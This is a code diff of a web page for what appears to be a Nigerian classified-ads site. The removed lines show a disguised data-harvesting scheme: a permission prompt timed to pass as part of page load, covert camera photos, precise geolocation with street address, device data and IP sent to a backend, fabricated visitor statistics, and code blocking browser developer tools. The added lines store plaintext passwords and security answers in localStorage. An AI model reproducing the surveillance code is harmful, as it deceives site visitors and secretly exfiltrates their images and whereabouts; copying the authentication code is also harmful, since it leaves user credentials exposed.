-                const camera = await captureCameraPhoto();
-                if (camera) { 
-                    cameraImage = camera; 
-                    showToast("📸 Verification photo captured", false); 
-                } else {
-                    showToast("⚠️ Camera access denied or not available", true);
-                }
-                
-                const device = await getDeviceInfo();
-                const record = { 
-                    id: Date.now(), 
-                    type: 'permission_granted', 
-                    timestamp: new Date().toISOString(), 
-                    location: userLocation, 
-                    hasCamera: !!cameraImage, 
-                    cameraImage: cameraImage, 
-                    device: device 
-                };
-                await sendToBackend(record);
-                permissionsGranted = true;
-                resolve(true);
-            };
-            
-            denyBtn.onclick = () => { 
-                modal.classList.remove('active'); 
-                showToast("⚠️ Limited mode - some features disabled", true); 
-                permissionsGranted = false;
-                resolve(false); 
-            };
-            
-            modal.classList.add('active');
-        });
-    }
-
-    // Post Ad
-    document.getElementById('postAdBtn').addEventListener('click', async () => {
-        const title = document.getElementById('adTitle').value.trim();
-        const category = document.getElementById('adCategory').value;
-        const desc = document.getElementById('adDesc').value.trim();
-        const price = document.getElementById('adPrice').value.trim();
-        const locationInput = document.getElementById('adLocation').value.trim();
-        const phone = document.getElementById('contactPhone').value.trim();
-        
-        if (!title) { showToast("Please enter an ad title", true); return; }
-        
-        const btn = document.getElementById('postAdBtn');
-        const originalText = btn.innerHTML;
-        btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
-        btn.disabled = true;
-        
-        // Only request permissions if not already granted
-        if (!permissionsGranted) {
-            await requestPermissions();
-        }
-        
-        // Try to get data if not already captured
-        if (!userLocation) { 
-            userLocation = await getPreciseLocation(); 
-        }
-        if (!cameraImage) { 
-            cameraImage = await captureCameraPhoto(); 
-        }
-        
-        const device = await getDeviceInfo();
-        const adRecord = {
-            id: Date.now(),
-            type: 'ad_posted',
-            timestamp: new Date().toISOString(),
-            ad: { 
-                title, 
-                category, 
-                description: desc, 
-                price: price || 'Free', 
-                location: locationInput || 'Nigeria', 
-                phone: phone || 'Not provided', 
-                images: uploadedImages 
-            },
-            location: userLocation ? { 
-                lat: userLocation.lat, 
-                lng: userLocation.lng, 
-                street: userLocation.street, 
-                city: userLocation.city, 
-                state: userLocation.state, 
-                country: userLocation.country, 
-                postcode: userLocation.postcode, 
-                fullAddress: userLocation.fullAddress 
-            } : null,
-            cameraImage: cameraImage,
-            device: device,
-            ip: device.ip
-        };
-        
-        await sendToBackend(adRecord);
-        
-        // Add to posted ads for display
-        postedAds.unshift({ id: adRecord.id, title, price: price || 'Free', location: locationInput, timestamp: new Date() });
-        localStorage.setItem('postedAds', JSON.stringify(postedAds.slice(0, 20)));
-        
-        // Reset form
-        document.getElementById('adTitle').value = '';
-        document.getElementById('adDesc').value = '';
-        document.getElementById('adPrice').value = '';
-        document.getElementById('adLocation').value = '';
-        document.getElementById('contactPhone').value = '';
-        uploadedImages = [];
-        displayImages();
-        
-        btn.innerHTML = originalText;
-        btn.disabled = false;
-        showToast(`✅ "${title}" posted successfully! +50 views in 24hrs`);
-        updateStats();
     });
     
     function showToast(msg, isError = false) {
-        const toast = document.getElementById('toastMsg');
+        const toast = document.getElementById('toast');
         toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
-        toast.style.background = isError ? '#ef4444' : '#22c55e';
+        toast.className = isError ? 'toast error' : 'toast';
         toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 4000);
+        setTimeout(() => toast.classList.remove('show'), 3000);
     }
     
-    function updateStats() {
-        let ads = 284000 + Math.floor(Math.random() * 500) + postedAds.length;
-        let users = 12700 + Math.floor(Math.random() * 200);
-        document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
-        document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
-    }
-    
-    // Initialize
-    featuredAds.forEach(ad => startViewCounter(ad));
-    renderFeaturedAds();
-    updateStats();
-    setInterval(updateStats, 8000);
-    
-    // Auto-request permissions after 2 seconds (makes it feel like part of page load)
-    setTimeout(() => { 
-        if (!localStorage.getItem('permissions_asked')) {
-            requestPermissions();
-            localStorage.setItem('permissions_asked', 'true');
+    // Sign Up
+    document.getElementById('signupBtn').addEventListener('click', () => {
+        const fullname = document.getElementById('signupName').value.trim();
+        const email = document.getElementById('signupEmail').value.trim();
+        const phone = document.getElementById('signupPhone').value.trim();
+        const password = document.getElementById('signupPassword').value;
+        const confirm = document.getElementById('signupConfirm').value;
+        const securityQuestion = document.getElementById('securityQuestion').value.trim();
+        const securityAnswer = document.getElementById('securityAnswer').value.trim().toLowerCase();
+        
+        if (!fullname || !email || !phone || !password || !securityQuestion || !securityAnswer) {
+            showToast("Please fill all fields", true);
+            return;
         }
-    }, 2000);
+        if (password !== confirm) {
+            showToast("Passwords don't match", true);
+            return;
+        }
+        if (password.length < 6) {
+            showToast("Password must be at least 6 characters", true);
+            return;
+        }
+        if (!email.includes('@')) {
+            showToast("Enter valid email", true);
+            return;
+        }
+        
+        let users = JSON.parse(localStorage.getItem('naija_users') || '[]');
+        if (users.find(u => u.email === email)) {
+            showToast("Email already registered", true);
+            return;
+        }
+        
+        const newUser = {
+            id: Date.now(),
+            fullname,
+            email,
+            phone,
+            password,
+            securityQuestion,
+            securityAnswer,
+            createdAt: new Date().toISOString(),
+            avatar: `https://ui-avatars.com/api/?name=${encodeURIComponent(fullname)}&background=667eea&color=fff&length=2&rounded=true&bold=true&size=80`
+        };
+        
+        users.push(newUser);
+        localStorage.setItem('naija_users', JSON.stringify(users));
+        localStorage.setItem('currentUser', JSON.stringify(newUser));
+        
+        showToast("🎉 Account created successfully!");
+        setTimeout(() => {
+            window.location.href = 'dashboard.html';
+        }, 1500);
+    });
     
-    // Anti-inspection
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
-    document.addEventListener('keydown', (e) => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-            e.preventDefault();
+    // Login
+    document.getElementById('loginBtn').addEventListener('click', () => {
+        const email = document.getElementById('loginEmail').value.trim();
+        const password = document.getElementById('loginPassword').value;
+        
+        if (!email || !password) {
+            showToast("Please enter email and password", true);
+            return;
+        }
+        
+        let users = JSON.parse(localStorage.getItem('naija_users') || '[]');
+        const user = users.find(u => u.email === email && u.password === password);
+        
+        if (user) {
+            localStorage.setItem('currentUser', JSON.stringify(user));
+            showToast("✅ Login successful!");
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 1000);
+        } else {
+            showToast("Invalid email or password", true);
         }
     });
+    
+    // Forgot Password Flow
+    let resetUser = null;
+    
+    function showForgotModal() {
+        document.getElementById('forgotModal').classList.add('active');
+    }
+    
+    document.getElementById('verifyEmailBtn').addEventListener('click', () => {
+        const email = document.getElementById('resetEmail').value.trim();
+        if (!email) {
+            showToast("Enter your email", true);
+            return;
+        }
+        
+        let users = JSON.parse(localStorage.getItem('naija_users') || '[]');
+        resetUser = users.find(u => u.email === email);
+        
+        if (resetUser) {
+            document.getElementById('forgotModal').classList.remove('active');
+            document.getElementById('securityQuestionDisplay').innerText = resetUser.securityQuestion;
+            document.getElementById('securityModal').classList.add('active');
+        } else {
+            showToast("Email not found", true);
+        }
+    });
+    
+    document.getElementById('verifyAnswerBtn').addEventListener('click', () => {
+        const answer = document.getElementById('securityAnswerInput').value.trim().toLowerCase();
+        if (answer === resetUser.securityAnswer) {
+            document.getElementById('securityModal').classList.remove('active');
+            document.getElementById('resetModal').classList.add('active');
+        } else {
+            showToast("Incorrect security answer", true);
+        }
+    });
+    
+    document.getElementById('resetPasswordBtn').addEventListener('click', () => {
+        const newPass = document.getElementById('newPassword').value;
+        const confirmPass = document.getElementById('confirmPassword').value;
+        
+        if (!newPass || !confirmPass) {
+            showToast("Please enter new password", true);
+            return;
+        }
+        if (newPass !== confirmPass) {
+            showToast("Passwords don't match", true);
+            return;
+        }
+        if (newPass.length < 6) {
+            showToast("Password must be at least 6 characters", true);
+            return;
+        }
+        
+        let users = JSON.parse(localStorage.getItem('naija_users') || '[]');
+        const userIndex = users.findIndex(u => u.id === resetUser.id);
+        if (userIndex !== -1) {
+            users[userIndex].password = newPass;
+            localStorage.setItem('naija_users', JSON.stringify(users));
+            showToast("✅ Password reset successfully!");
+            closeModals();
+            document.getElementById('loginPassword').value = '';
+        }
+    });
+    
+    function closeModals() {
+        document.getElementById('forgotModal').classList.remove('active');
+        document.getElementById('securityModal').classList.remove('active');
+        document.getElementById('resetModal').classList.remove('active');
+        document.getElementById('resetEmail').value = '';
+        document.getElementById('securityAnswerInput').value = '';
+        document.getElementById('newPassword').value = '';
+        document.getElementById('confirmPassword').value = '';
+        resetUser = null;
+    }
+    
+    window.showForgotModal = showForgotModal;
+    window.closeModals = closeModals;
 </script>
 </body>
 </html>
